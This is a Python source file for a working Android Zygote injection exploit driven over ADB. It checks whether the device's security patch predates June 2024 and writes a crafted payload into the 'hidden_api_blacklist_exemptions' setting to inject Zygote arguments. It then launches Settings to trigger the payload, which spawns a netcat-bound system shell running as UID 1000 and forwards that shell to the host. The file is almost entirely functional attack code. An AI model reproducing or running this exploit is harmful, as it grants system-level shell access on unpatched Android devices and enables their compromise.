import socket

import time

import shlex

import datetime

from typing import Optional, Union

from enum import Enum

import subprocess

import sys

from .exceptions import *

from ppadb.client import Client as AdbClient

class ConnectResult(Enum):

    success = 0

    success_specific_device = 1

    failed_multiple_devices = 2

    failed_no_devices = 3

    failed_specific_device = 4

    @property

    def succeeded(self) -> bool:

        return self.value in (self.success, self.success_specific_device)

PropValue = Union[str, int, float, bool]

class Stage1Exploit:

    def __init__(

        self,

        device_serial: Optional[str] = None,

        transport_id: Optional[str] = None,

        usb: bool = False,

        tcpip: bool = False,

        auto_connect: bool = True,

        adb_client: Optional[AdbClient] = None,

    ) -> None:

        if adb_client is None:

            self._adb_client = AdbClient()

        else:

            self._adb_client = adb_client

        self.transport_id = transport_id

        self.usb = usb

        self.tcpip = tcpip

        if auto_connect:

            self.connect(device_serial)

    def _remove_forward(self, port: int):

        from .adb_helper import AdbHelper

        AdbHelper.remove_forward(

            f"tcp:{port}",

            serial=self.device.serial if hasattr(self, 'device') and self.device else None,

            transport_id=self.transport_id,

            usb=self.usb,

            tcpip=self.tcpip

        )

    def _restart_adb_server(self):

        from .adb_helper import AdbHelper

        AdbHelper.restart_adb_server()

    def connect(self, device_serial: Optional[str]) -> None:

        devices = self._adb_client.devices()

        if self.transport_id:

            from .adb_helper import AdbHelper

            devs = AdbHelper.get_connected_devices()

            target = next((d for d in devs if d['transport_id'] == self.transport_id), None)

            if not target: raise ZygoteInjectionDeviceNotFoundException(f"Transport ID {self.transport_id} not found")

            device_serial = target['serial']

        elif self.usb:

             from .adb_helper import AdbHelper

             devs = AdbHelper.get_connected_devices()

             target = next((d for d in devs if d['type'] == "USB"), None)

             if not target: raise ZygoteInjectionNoDeviceException("No USB device found")

             device_serial = target['serial']

        elif self.tcpip:

             from .adb_helper import AdbHelper

             devs = AdbHelper.get_connected_devices()

             target = next((d for d in devs if d['type'] == "TCP/IP"), None)

             if not target: raise ZygoteInjectionNoDeviceException("No TCP/IP device found")

             device_serial = target['serial']

        if device_serial is None:

            if len(devices) == 1:

                device = devices[0]

            elif len(devices) == 0:

                raise ZygoteInjectionNoDeviceException("no devices found")

            else:

                raise ZygoteInjectionMultipleDevicesException(

                    "multiple devices found and no device has been explicitly specified"

                )

        else:

            for current_device in devices:

                if current_device.serial == device_serial:

                    device = current_device

                    break

            else:

                raise ZygoteInjectionDeviceNotFoundException(

                    f"device with serial {repr(device_serial)} was not found"

                )

        self.device = device

    def shell_execute(

        self,

        command: Union[list, str],

        allow_error: bool = False,

        separate_stdout_stderr: bool = True,

        timeout: Optional[float] = None,

    ) -> dict:

        try:

            command + ""

        except TypeError:

            escaped_command = shlex.join(command)

        else:

            escaped_command = command

        result = self.device.shell_v2(

            escaped_command,

            separate_stdout_stderr=separate_stdout_stderr,

            timeout=timeout,

        )

        if separate_stdout_stderr:

            stdout, stderr, exit_code = result

        else:

            output, exit_code = result

        if exit_code and not allow_error:

            raise ZygoteInjectionCommandFailedException(

                f'command "{escaped_command}" failed with exit code {exit_code:d}'

            )

        result = {}

        if allow_error:

            result["exit_code"] = exit_code

        if separate_stdout_stderr:

            result["stdout"] = stdout

            result["stderr"] = stderr

        else:

            result["output"] = output

        return result

    def getprop(self, name: str) -> PropValue:

        prop_type_result = self.shell_execute(["getprop", "-T", "--", name])

        prop_type = prop_type_result["stdout"]

        if prop_type.endswith("\n"):

            prop_type = prop_type[: -len("\n")]

        prop_value_result = self.shell_execute(["getprop", "--", name])

        prop_value = prop_value_result["stdout"]

        if prop_value.endswith("\n"):

            prop_value = prop_value[: -len("\n")]

        if prop_type == "string" or prop_type.startswith("enum"):

            return prop_value

        elif prop_type in ("int", "uint"):

            return int(prop_value)

        elif prop_type == "double":

            return float(prop_value)

        elif prop_type == "bool":

            if prop_value in ("true", "1"):

                return True

            elif prop_value in ("false", "0"):

                return False

            else:

                raise ValueError(f"invalid literal for bool: {repr(prop_value)}")

        else:

            raise NotImplementedError(f"unsupported property type: {repr(prop_type)}")

    def setprop(self, name: str, value: PropValue) -> None:

        if isinstance(value, bool):

            if value:

                value_string = "true"

            else:

                value_string = "false"

        else:

            value_string = str(value)

        self.shell_execute(["setprop", "--", name, value_string])

    def get_setting(self, namespace: str, name: str) -> str:

        result = self.shell_execute(["settings", "get", namespace, name])

        output = result["stdout"]

        if output.endswith("\n"):

            return output[: -len("\n")]

        else:

            return output

    def exploit_type(self) -> str:

        android_version = int(self.getprop("ro.build.version.release"))

        security_patch = self.getprop("ro.build.version.security_patch")

        EXPLOIT_PATCH_DATE = datetime.date(2024, 6, 1)

        if security_patch:

            security_patch_date = datetime.datetime.strptime(

                security_patch, "%Y-%m-%d"

            ).date()

            if security_patch_date >= EXPLOIT_PATCH_DATE:

                raise ZygoteInjectionNotVulnerableException(

                    f'Your latest security patch is at {security_patch_date.strftime("%Y-%m-%d")}, '

                    f'but the exploit was patched on {EXPLOIT_PATCH_DATE.strftime("%Y-%m-%d")} :('

                    "Sorry!"

                )

        if android_version >= 12:

            return "new"

        else:

            return "old"

    def find_netcat_command(self) -> list:

        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"]]

        for command in NETCAT_COMMANDS:

            result = self.shell_execute(command + ["--help"], True)

            if result["exit_code"] == 0:

                return command

        else:

            raise ZygoteInjectionException("netcat binary was not found")

    @staticmethod

    def generate_stage1_exploit(command: str, exploit_type: str, uid: int = 1000, gid: int = 1000, seinfo: str = "default") -> str:

        assert exploit_type in ("old", "new")

        assert "," not in command

        raw_zygote_arguments = [

            f"--setuid={uid}",

            f"--setgid={gid}",

            "--setgroups=3003",

            "--runtime-args",

            f"--seinfo={seinfo}",

            "--runtime-flags=1",

            "--nice-name=runmenetcat",

            "--invoke-with",

            f"{command}#",

        ]

        zygote_arguments = "\n".join(

            [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments

        )

        if exploit_type == "old":

            return f"LClass1;->method1(\n{zygote_arguments}"

        elif exploit_type == "new":

            payload = "\n" * 3000 + "A" * 5157

            payload += zygote_arguments

            payload += "," + ",\n" * 1400

            return payload

    def is_port_open(self, port: int) -> bool:

        result = self.shell_execute("netstat -tpln")

        for line in result["stdout"].split("\n"):

            split_line = line.split()

            try:

                local_address = split_line[3]

            except IndexError:

                pass

            else:

                if local_address.endswith(f":{port:d}"):

                    return True

        return False

    def exploit_stage1(self, uid: int = 1000, gid: int = 1000, port: int = 1234, seinfo: Optional[str] = None, trigger_package: str = "com.android.settings") -> bool:

        self._remove_forward(port)

        if self.is_port_open(port):

            should_restart = False

            if uid != 1000:

                print(f"Exploit is running but a specific UID ({uid}) was requested. Restarting exploit...")

                self.shell_execute("pkill -f runmenetcat", allow_error=True)

                time.sleep(1)

                should_restart = True

            else:

                 print("The exploit is already running with System context.")

            if not should_restart:

                self._restart_adb_server()

                self._remove_forward(port)

                try:

                    self.device.forward(f"tcp:{port}", f"tcp:{port}")

                    print("Stage 1 success!")

                    return True

                except RuntimeError as e:

                    print(f"Error establishing adb forward to existing exploit: {e}", file=sys.stderr)

                    print("Please ensure adb is properly configured and not blocked by other processes.", file=sys.stderr)

                    return False

        self.shell_execute(

            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]

        )

        exploit_type = self.exploit_type()

        if exploit_type == "new":

            print("Using new (Android 12+) exploit type")

        elif exploit_type == "old":

            print("Using old (pre-Android 12) exploit type")

        netcat_command = self.find_netcat_command()

        parsed_netcat_command = shlex.join(netcat_command)

        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p {port} -L /system/bin/sh)&"

        if seinfo is None:

            seinfo = "default"

        exploit_value = self.generate_stage1_exploit(command, exploit_type, uid=uid, gid=gid, seinfo=seinfo)

        exploit_command = [

            "settings",

            "put",

            "global",

            "hidden_api_blacklist_exemptions",

            exploit_value,

        ]

        print(f"[*] Triggering exploit by launching {trigger_package}...")

        self.shell_execute(["am", "force-stop", trigger_package])

        self.shell_execute(exploit_command)

        time.sleep(0.25)

        if trigger_package == "com.android.settings":

            self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])

        else:

            self.shell_execute(["monkey", "-p", trigger_package, "-c", "android.intent.category.LAUNCHER", "1"])

        print("Zygote injection complete, waiting for code to execute...")

        for current_try in range(20):

            setting_value = self.get_setting(

                "global", "hidden_api_blacklist_exemptions"

            )

            if setting_value == "null":

                if self.is_port_open(port):

                    self._restart_adb_server()

                    self._remove_forward(port)

                    try:

                        self.device.forward(f"tcp:{port}", f"tcp:{port}")

                        print("Stage 1 success!")

                        return True

                    except RuntimeError as e:

                        print(f"Error establishing adb forward after exploit: {e}", file=sys.stderr)

                        print("Please ensure adb is properly configured and not blocked by other processes.", file=sys.stderr)

                        return False

                else:

                    raise ZygoteInjectionException(

                        "setting was deleted but no listener was found"

                    )

            time.sleep(0.5)

        print("Stage 1 failed, reboot and try again")

        self.shell_execute(

            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]

        )

        return False
